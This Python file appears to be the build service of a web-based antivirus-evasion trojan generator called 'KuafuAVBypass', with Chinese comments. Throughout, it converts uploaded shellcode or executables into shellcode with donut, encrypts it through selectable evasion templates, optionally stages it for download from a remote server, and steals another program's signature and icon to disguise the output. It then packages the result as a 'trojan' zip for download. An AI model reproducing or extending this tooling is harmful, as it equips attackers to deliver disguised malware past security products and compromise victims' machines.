
from . import template5
from. import template1,template2,template3,template4
from. import Thief
import os
import logging
from KuafuAVBypass import settings
import shutil
import hashlib
import subprocess
import pefile
logger = logging.getLogger('django')


def check_user_workspace(user_id):
    user_workspace_dirs = ["encoder", "loader", "binary", "shellcode"]
    user_workspace_root_path = os.path.join(settings.BASE_DIR, "media", "workspace", str(user_id))

    # 尝试初始化用户工作区的记录
    logger.info(f"Initializing workspace for user {user_id}.")

    # 检查用户工作区文件夹是否存在，不存在则新建
    if not os.path.exists(user_workspace_root_path):
        try:
            os.makedirs(user_workspace_root_path)
        except OSError as error:
            logger.error(f"Failed to create root workspace directory '{user_workspace_root_path}', error: {error}")
            return 1
        
    # 现在创建子目录
    for dir_name in user_workspace_dirs:
        dir_path = os.path.join(user_workspace_root_path, dir_name)
        if not os.path.exists(dir_path):
            try:
                os.makedirs(dir_path)
            except OSError as error:
                logger.error(f"Failed to create workspace subdirectory '{dir_path}', error: {error}")
                return 1                
    logger.info(f"Workspace initialization for user {user_id} succeeded.")
    return 0


def get_user_shellcode_file(shellcode_file_path,user_shellcode_file_path):
    ext = shellcode_file_path.split('.')[-1].lower()
    print(shellcode_file_path)

    #判断shellcode文件类型，一律另存为shellcode.bin
    if ext == "c":
    # 打开payload.c文件
        with open(shellcode_file_path, 'r') as c_file:
            data = c_file.read()  # 从文件中读取数据
        # 从读取的数据中提取shellcode
        start = data.find('"') + 1  # 找到第一个引号后面的位置
        end = data.find('"', start)  # 找到第一个引号之后的第二个引号的位置
        shellcode_string = data[start:end]  # 获取两个引号之间的shellcode
        # 将shellcode转换为二进制数据
        shellcode_bytes = bytes.fromhex(''.join(shellcode_string.split(r'\x')[1:]))
        # 将二进制数据写入1.bin文件
        with open(user_shellcode_file_path, 'wb') as bin_file:
            bin_file.write(shellcode_bytes)
    elif ext == "bin":
        shutil.copy(shellcode_file_path, user_shellcode_file_path)
    elif ext == "exe":
        try:
            pe = pefile.PE(shellcode_file_path)
            if pe.FILE_HEADER.Machine == 0x014c:
                subprocess.run(["donut.exe", "-f", "-i", shellcode_file_path, "-o", user_shellcode_file_path, "-a1"], check=True)
            elif pe.FILE_HEADER.Machine == 0x8664:
                subprocess.run(["donut.exe", "-f", "-i", shellcode_file_path, "-o", user_shellcode_file_path, "-a2"], check=True)
            else:
                return "Unknown architecture"
        except FileNotFoundError:
            return "File not found"
        except pefile.PEFormatError:
            return "Not a valid PE file"
        except Exception as e:
            return "Error: " + str(e)


def copy_directory_and_rename(src_dir, dst_dir_with_new_name):
    """
    将整个src_dir目录树复制到指定的目标路径，并给复制的目录一个新的名称。
    如果目标目录已经存在，则先删除它然后覆盖。
    :param src_dir: 源目录路径
    :param dst_dir_with_new_name: 目标目录的路径，包括复制后的新名称
    """
    # 检查目标目录是否存在，如果存在，则删除
    if os.path.exists(dst_dir_with_new_name):
        shutil.rmtree(dst_dir_with_new_name)
        print(f"目标目录 {dst_dir_with_new_name} 已存在，将被删除和覆盖。")

    # 复制整个目录树到目标目录，此时目标目录包括了新的名称
    shutil.copytree(src_dir, dst_dir_with_new_name)
    print(f"目录 {src_dir} 已成功复制并覆盖到 {dst_dir_with_new_name}。")

def generate_hash(file_path):
    hasher = hashlib.md5()
    with open(file_path, 'rb') as f:
        buf = f.read()
        hasher.update(buf)
    return hasher.hexdigest()[:15]


def add_signature_and_icon(icon_file,signature_file,inputfile,outputfile):
    if icon_file and signature_file:
        Thief.replace_signature_and_icon(inputfile, signature_file, icon_file, outputfile)
    elif icon_file:
        Thief.replace_icon(inputfile,icon_file,outputfile)
    elif signature_file:
        Thief.replace_signature(inputfile, signature_file, outputfile)
    # else:
    #     shutil.copy(inputfile, outputfile)


def compileService(trojan):
    remote = trojan.shellcode_remote
    shellcode_file_name = trojan.shellcode_file_name
    plan = trojan.chosen_plan
    key = trojan.encode_key
    user_id = trojan.user.id
    remote_shellcode_url = trojan.user.shellcode_ip_addr

    #定义签名和图标文件路径
    if trojan.icon_file:
        icon = str(trojan.icon_file)
        icon_file = os.path.join("media", icon)
    else:
        icon_file = ""
    if trojan.signature_file:
        signature = str(trojan.signature_file)
        signature_file = os.path.join("media", signature)
    else:
        signature_file = ""
    
    #模板化定义文件路径（不建议修改！！！）
    user_workspace_path = os.path.join("media", "workspace", str(user_id))
    user_encoder_path = os.path.join(user_workspace_path, "encoder")
    user_loader_path = os.path.join(user_workspace_path, "loader")
    user_binary_path = os.path.join(user_workspace_path, "binary")
    shellcode_file =  os.path.join("media", "uploads", "shellcode", shellcode_file_name)
    user_shellcode_file = os.path.join(user_workspace_path, "shellcode", "shellcode.bin")
    user_encode_shellcode_file = os.path.join(user_workspace_path, "shellcode", "encode_shellcode.bin")
    tmp_encoder_path = os.path.join("media", "templates", plan, "encoder")
    if remote:
        tmp_path = "remote"
        tmp_loader_path = os.path.join("media", "templates", plan, "loader", tmp_path)
    else:
        tmp_path = "local"
        tmp_loader_path = os.path.join("media", "templates", plan, "loader", tmp_path)
    trojan_tmp_file = os.path.join(user_binary_path,"binaryfile.exe")
    trojan_download_path = os.path.join("media", "binaryfile")
    
    #初始化用户编译工作区文件目录
    check_user_workspace(str(user_id))
    copy_directory_and_rename(tmp_loader_path,user_loader_path)
    copy_directory_and_rename(tmp_encoder_path,user_encoder_path)
    get_user_shellcode_file(shellcode_file,user_shellcode_file)
    
    
    #选择免杀模板进行编译>
    if plan == "template1":
        new_filename = template1.compile(
            key,
            user_encoder_path, 
            user_loader_path, 
            user_binary_path,
            user_shellcode_file,
            user_encode_shellcode_file,
            remote,
            remote_shellcode_url
        )
    elif plan == "template2":
        new_filename = template2.compile(
            key,
            user_encoder_path, 
            user_loader_path, 
            user_binary_path,
            user_shellcode_file,
            user_workspace_path,
            remote,
            remote_shellcode_url
        )
    elif plan == "template3":
        new_filename = template3.compile(
            key,
            user_encoder_path, 
            user_loader_path, 
            user_binary_path,
            user_shellcode_file,
            user_encode_shellcode_file,
            remote,
            remote_shellcode_url
    )  
    elif plan == "template4":
        new_filename = template4.compile(
            key,
            user_encoder_path, 
            user_loader_path, 
            user_binary_path,
            user_shellcode_file,
            user_encode_shellcode_file,
            remote,
            remote_shellcode_url
        )
    elif plan == "template5":
        new_filename = template5.compile(
            key,
            user_encoder_path, 
            user_loader_path, 
            user_binary_path,
            user_shellcode_file,
            user_encode_shellcode_file,
            remote,
            remote_shellcode_url
    )


    
    #给木马添加签名和图标
    add_signature_and_icon(icon_file,signature_file,trojan_tmp_file,trojan_tmp_file)
    
    #删除签名和图标文件
    try:
        if os.path.isfile(icon_file):
            os.remove(icon_file)
        if os.path.isfile(signature_file):
            os.remove(signature_file)
    except Exception as e:
        print(f"Error occurred while deleting files: {e}")

    hash_name = generate_hash(trojan_tmp_file)
    shutil.move(trojan_tmp_file,os.path.join(user_binary_path, hash_name+'.exe'))
    shutil.make_archive(os.path.join(trojan_download_path,"trojan"), 'zip', user_binary_path)
    shutil.move(os.path.join(trojan_download_path,'trojan.zip'), os.path.join(trojan_download_path,hash_name+'.zip'))
    trojan.file_hash = hash_name+'.zip' 

    if new_filename:
        trojan.shellcode_remote_addr = remote_shellcode_url + new_filename
        os.remove(os.path.join(user_binary_path, new_filename))
    os.remove(os.path.join(user_binary_path, hash_name+'.exe'))
    return(trojan)

